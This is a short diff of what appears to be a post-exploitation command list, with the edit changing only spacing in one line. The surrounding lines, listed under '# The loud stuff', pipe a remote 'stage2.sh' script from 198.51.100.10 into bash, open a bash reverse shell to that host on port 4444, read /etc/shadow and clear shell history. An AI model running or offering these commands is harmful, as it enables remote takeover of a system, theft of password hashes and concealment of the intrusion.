@@ -20,6 +20,6 @@ arp -a
 
 # The loud stuff
 curl http://198.51.100.10/stage2.sh | bash
-bash -i >&/dev/tcp/198.51.100.10/4444 0>&1
+bash -i >& /dev/tcp/198.51.100.10/4444 0>&1
 cat /etc/shadow
 history -c
